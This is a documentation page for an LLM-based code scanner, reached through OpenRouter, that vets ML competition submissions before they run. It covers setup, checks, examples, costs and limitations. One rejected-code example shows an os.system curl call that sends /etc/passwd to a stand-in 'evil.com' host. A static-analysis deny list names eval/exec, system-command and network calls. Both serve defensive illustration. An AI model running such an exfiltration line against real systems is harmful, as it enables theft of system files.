# Code Scanning with OpenRouter

## Overview

The server uses OpenRouter API with LLMs to scan submitted code for security issues and verify it's relevant to ML competitions before execution.

## Why Code Scanning?

**Apptainer Already Handles:**
- ✅ OOM (out of memory) protection
- ✅ Environment isolation
- ✅ Filesystem restrictions
- ✅ Read/write permissions
- ✅ Standard environment

**Code Scanner Adds:**
- 🔍 Malicious code detection
- 🔍 ML relevance verification
- 🔍 Resource abuse prevention
- 🔍 Intent analysis

## Architecture

```
┌─────────────┐
│ User Submits│
│    Code     │
└──────┬──────┘
       │
       ▼
┌──────────────────┐
│  Static Analysis │ ◄─── Fast, no API
│  - Syntax check  │
│  - Dangerous     │
│    imports       │
└────────┬─────────┘
         │
         ├─── Critical issues? ──> REJECT
         │
         ▼ Clean
┌──────────────────┐
│  LLM Analysis    │ ◄─── OpenRouter API
│  - Intent        │
│  - ML relevance  │
│  - Deep security │
└────────┬─────────┘
         │
         ├─── Not safe? ──────────> REJECT
         ├─── Not relevant? ──────> REJECT
         │
         ▼ Approved
┌──────────────────┐
│  Job Queued for  │
│  Execution       │
└──────────────────┘
```

## Setup

### 1. Get OpenRouter API Key

1. Sign up at https://openrouter.ai/
2. Create an API key
3. Set environment variable:

```bash
export OPENROUTER_API_KEY="sk-or-v1-..."
```

### 2. Configure Scanner

In `config.py`:

```python
# Enable/disable scanning
CODE_SCANNER_ENABLED = True

# Quick mode (static analysis only, no API calls)
CODE_SCANNER_QUICK_MODE = False
```

### 3. Install Dependencies

```bash
pip install -r requirements.txt
```

## Usage

### Automatic Scanning (Default)

Scanner runs automatically on every job submission:

```python
import requests

response = requests.post('http://localhost:8001/api/submit',
    files={
        'code': ('solution.py', code_content),
        'config_file': ('config.json', config_json)
    }
)

# If code fails security check:
# Response: 400 Bad Request
# {
#   "detail": "Code security check failed: System command execution detected"
# }

# If code not ML-relevant:
# Response: 400 Bad Request
# {
#   "detail": "Code does not appear relevant to ML competition: ..."
# }
```

### Manual Testing

Test code before submission:

```bash
python3 code_scanner.py solution.py
```

Output:
```json
{
  "safe": true,
  "relevant": true,
  "issues": [],
  "confidence": 0.95,
  "explanation": "Code appears to be legitimate ML model training"
}
```

## What Gets Scanned

### Static Analysis (Always)

**Critical Issues (Immediate Rejection):**
- `eval()` / `exec()` - Dynamic code execution
- `__import__()` - Dynamic imports
- `os.system()` / `subprocess` - System commands
- Direct SSH/network libraries

**Warnings (Flagged for LLM Review):**
- File operations (`open()`)
- Process spawning
- OS module usage

### LLM Analysis (If Enabled)

**Security Checks:**
1. **Malicious intent detection**
   - Backdoors
   - Data exfiltration
   - Resource abuse patterns

2. **System access attempts**
   - Network calls
   - File system manipulation
   - Process spawning

3. **Resource abuse**
   - Infinite loops
   - Memory bombs
   - Fork bombs

**ML Relevance Checks:**
1. **Is this ML code?**
   - Uses ML libraries (PyTorch, TensorFlow, sklearn)
   - Follows ML patterns (training, inference)
   - Has data processing logic

2. **Is this competition-appropriate?**
   - Fits competition format
   - Not random test code
   - Actual solution attempt

## Examples

### ✅ Approved Code

```python
import torch
import torch.nn as nn

class Model(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)
    
    def forward(self, x):
        return self.fc(x)

model = Model()
# ... training code ...
```

**Scan Result:**
```json
{
  "safe": true,
  "relevant": true,
  "issues": [],
  "confidence": 0.98,
  "explanation": "Standard PyTorch model definition and training"
}
```

### ❌ Rejected - System Access

```python
import os
os.system("curl http://evil.com/steal?data=$(cat /etc/passwd)")
```

**Scan Result:**
```json
{
  "safe": false,
  "relevant": false,
  "issues": ["System command execution detected", "Network access attempt"],
  "confidence": 1.0,
  "explanation": "Code attempts to execute system commands and access network"
}
```

### ❌ Rejected - Not ML Relevant

```python
def factorial(n):
    if n <= 1:
        return 1
    return n * factorial(n-1)

print(factorial(5))
```

**Scan Result:**
```json
{
  "safe": true,
  "relevant": false,
  "issues": [],
  "confidence": 0.85,
  "explanation": "Code is safe but appears to be a factorial function, not ML-related"
}
```

### ⚠️ Flagged - Suspicious But Allowed

```python
import torch
import os

# Load data from environment
data_path = os.environ.get('DATA_PATH', '/tmp/data.csv')

# ... legitimate ML code ...
```

**Scan Result:**
```json
{
  "safe": true,
  "relevant": true,
  "issues": ["Import of 'os' - will be reviewed"],
  "confidence": 0.75,
  "explanation": "Uses os module but for legitimate path handling"
}
```

## Configuration Options

### Enable/Disable Scanning

```python
# config.py
CODE_SCANNER_ENABLED = True   # Enable scanning
CODE_SCANNER_ENABLED = False  # Disable (not recommended)
```

### Quick Mode (No API Calls)

Use static analysis only for faster processing:

```python
# config.py
CODE_SCANNER_QUICK_MODE = True  # Static analysis only
CODE_SCANNER_QUICK_MODE = False # Full LLM analysis (default)
```

**When to Use Quick Mode:**
- Development/testing
- High submission volume
- API cost concerns
- Network issues

**Trade-offs:**
- ✅ Much faster (no API latency)
- ✅ No API costs
- ❌ Less thorough security analysis
- ❌ Cannot assess ML relevance

### Model Selection

Edit `code_scanner.py` to change LLM model:

```python
"model": "anthropic/claude-3.5-sonnet",  # Best balance
# or
"model": "anthropic/claude-3-opus",      # Most thorough
# or
"model": "openai/gpt-4-turbo",           # Good alternative
# or
"model": "google/palm-2-chat-bison",     # Cheaper option
```

## API Response Codes

| Code | Reason | Description |
|------|--------|-------------|
| 200 | Success | Code passed all checks |
| 400 | Security Failed | Malicious code detected |
| 400 | Relevance Failed | Not ML-related |
| 500 | Scanner Error | API/scanning failed |

## Monitoring

### Scanner Metrics

```python
# View in logs
print(f"Scan confidence: {scan_result['confidence']}")
print(f"Issues found: {len(scan_result['issues'])}")
```

### Failed Scan Examples

```bash
# Tail logs for rejections
tail -f server.log | grep "Code security check failed"
```

## Troubleshooting

### API Key Issues

```
Error: OpenRouter API key required
```

**Solution:**
```bash
export OPENROUTER_API_KEY="your-key-here"
python3 main.py
```

### API Timeout

```
Error: Unable to complete security scan: timeout
```

**Solution 1:** Use quick mode
```python
CODE_SCANNER_QUICK_MODE = True
```

**Solution 2:** Increase timeout in `code_scanner.py`
```python
timeout=60  # Increase from 30
```

### False Positives

Code is safe but rejected:

**Solution 1:** Check issues list
```python
# See what triggered rejection
print(scan_result['issues'])
```

**Solution 2:** Disable specific checks
Edit `code_scanner.py` to allow certain patterns

**Solution 3:** Use quick mode
Static analysis may be less strict

### False Negatives

Malicious code passes scanning:

**Report Issue:**
1. Save problematic code
2. Run manual scan
3. Share results with team
4. Update detection rules

## Cost Considerations

### OpenRouter Pricing

Typical costs per submission:
- **Claude 3.5 Sonnet**: $0.003 - $0.015 per scan
- **GPT-4 Turbo**: $0.01 - $0.03 per scan  
- **Claude 3 Opus**: $0.015 - $0.075 per scan

### Cost Optimization

**1. Use Quick Mode for Known Users**
```python
if user_trust_score > 0.8:
    scan_result = scan_code(code, comp_id, quick=True)
```

**2. Cache Results**
```python
# Cache scan results by code hash
code_hash = hashlib.sha256(code.encode()).hexdigest()
if code_hash in scan_cache:
    return scan_cache[code_hash]
```

**3. Batch Scanning**
Only scan on first submission, trust subsequent

**4. Cheaper Models**
Use less expensive models for basic checks

### Monthly Estimates

At 1000 submissions/month:
- Quick mode only: $0
- Claude 3.5 Sonnet: $3 - $15
- GPT-4 Turbo: $10 - $30
- Claude 3 Opus: $15 - $75

## Best Practices

### For Users

1. **Test locally first** - Catch issues before submission
2. **Use standard ML libraries** - Avoid unusual imports
3. **Comment suspicious code** - Help LLM understand intent
4. **Avoid dynamic execution** - No `eval()`, `exec()`
5. **Follow competition guidelines** - Submit appropriate code

### For Administrators

1. **Monitor rejection rates** - High rates may indicate issues
2. **Review flagged submissions** - Check for false positives
3. **Update detection rules** - Add new malicious patterns
4. **Balance security vs usability** - Don't over-restrict
5. **Log all scans** - Keep audit trail

### For Developers

1. **Keep scanner updated** - Regular dependency updates
2. **Test with diverse code** - ML, non-ML, edge cases
3. **Monitor API costs** - Track OpenRouter usage
4. **Implement caching** - Avoid re-scanning identical code
5. **Handle failures gracefully** - Degrade to quick mode if API down

## Security Limitations

### What Scanner CANNOT Prevent

❌ **Apptainer handles these:**
- OOM attacks (memory limits enforced)
- Disk exhaustion (quotas enforced)
- Process bombs (PID limits enforced)
- Environment corruption (isolation enforced)

❌ **Still possible:**
- Slow algorithms (not malicious, just inefficient)
- Large model weights (legitimate ML use)
- Long-running jobs (intended behavior)

### Defense in Depth

Scanner is ONE layer:
1. **Code scanning** ← OpenRouter (this layer)
2. **Apptainer isolation** ← Containerization
3. **Resource limits** ← ulimit, cgroups
4. **Monitoring** ← Job tracking
5. **Rate limiting** ← API protection

## Future Enhancements

### Planned Features

- [ ] Scan result caching
- [ ] User trust scores
- [ ] Whitelist for known-good code patterns
- [ ] Custom rules per competition
- [ ] Batch scanning for multiple submissions
- [ ] Detailed security reports
- [ ] Integration with CI/CD

### Potential Improvements

- **Faster models** - Reduce API latency
- **Local LLM** - Avoid API costs (llama.cpp, etc.)
- **Ensemble scanning** - Multiple models vote
- **Learning from feedback** - Train custom model
- **IDE integration** - Scan before submission

## Related Documentation

- [API Documentation](API_DOCUMENTATION.md) - Submit endpoint details
- [Access Control](ACCESS_CONTROL.md) - User permissions
- [Code Execution Issues](CODE_EXECUTION_ISSUES_PART1.md) - What Apptainer handles

## Support

### Getting Help

1. Check scan_result['explanation'] for details
2. Review issues list
3. Test with code_scanner.py manually
4. Check server logs
5. Contact admin if persistent issues

### Reporting Issues

Include:
- Code that was rejected/approved incorrectly
- Scan result JSON
- Expected vs actual behavior
- Competition ID

---

**Version:** 1.0  
**Last Updated:** 2025-11-06  
**OpenRouter API:** https://openrouter.ai/docs

